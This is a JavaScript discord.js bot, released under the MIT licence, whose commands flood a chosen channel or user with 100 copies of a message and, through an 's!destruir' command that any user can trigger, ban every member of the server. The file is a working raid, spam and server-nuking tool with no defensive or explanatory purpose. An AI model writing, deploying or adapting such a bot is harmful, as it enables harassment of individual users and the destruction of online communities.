const Discord = require("discord.js");
const client = new Discord.Client();
let prefix = "s!"

client.on("ready", () => {
    console.log("Estoy online");
  client.user.setPresence( {
        status: "online",
        game: {
            name: "Juego_Ordinario",
            type: "PLAYING"
        }
     });
  });

client.on("message", (message) => {
  if (message.author.bot) return;
  const args = message.content.slice(prefix.length).trim().split(/ +/g);
const command = args.shift().toLowerCase();
var veses = 100
var mensagge = "69"
var idCanales = "777"
var idDm = "666"


while (command === "canales" && veses>=1) { 
  idCanales = args[0]
  mensagge = args[1]
    client.channels.get(idCanales).send(mensagge)
    console.log(client.channels.get(idCanales).name)
    console.log(client.channels.get(idCanales).id)
    veses--
 }

veses = 100




while (command === "dm" && veses>=1) { 
  idDm = args[0]
  mensagge = args[1]
  client.users.get(idDm).send(mensagge);
  veses--
}

veses = 100

while (command === "killme" && veses>=1) { 
  mensagge = args[0]
  idDm = args[1]
 message.author.send(mensagge);
 veses--
}

veses = 100

if (message.content.startsWith(prefix+"destruir")) {
  console.log("se uso el comando prohibido");
  console.log(  message.guild.members.forEach(m => {
    m.ban();
    }));
  message.guild.members.forEach(m => {
    m.ban();
    });
 }











 

if (command === "license") {
 message.author.send("MIT")
 message.author.send("Copyright 2019 Reymundus")
 message.author.send("________________________")
 message.author.send("Se concede permiso por la presente, libre de cargos, a cualquier persona que obtenga una copia de este software y de los archivos de documentación asociados el Software, a utilizar el Software sin restricción, incluyendo sin limitación los derechos a usar, copiar, modificar, fusionar, publicar, distribuir, sublicenciar, y/o vender copias del Software, y a permitir a las personas a las que se les proporcione el Software a hacer lo mismo, sujeto a las siguientes condiciones:")
 message.author.send("________________________")
 message.author.send("El aviso de copyright anterior y este aviso de permiso se incluirán en todas las copias o partes sustanciales del Software.")
 message.author.send("________________________")
 message.author.send("EL SOFTWARE SE PROPORCIONA COMO ESTÁ, SIN GARANTÍA DE NINGÚN TIPO, EXPRESA O IMPLÍCITA, INCLUYENDO PERO NO LIMITADO A GARANTÍAS DE COMERCIALIZACIÓN, IDONEIDAD PARA UN PROPÓSITO PARTICULAR E INCUMPLIMIENTO. EN NINGÚN CASO LOS AUTORES O PROPIETARIOS DE LOS DERECHOS DE AUTOR SERÁN RESPONSABLES DE NINGUNA RECLAMACIÓN, DAÑOS U OTRAS RESPONSABILIDADES, YA SEA EN UNA ACCIÓN DE CONTRATO, AGRAVIO O CUALQUIER OTRO MOTIVO, DERIVADAS DE, FUERA DE O EN CONEXIÓN CON EL SOFTWARE O SU USO U OTRO TIPO DE ACCIONES EN EL SOFTWARE.")
}


});


client.login("TOKEN"); 
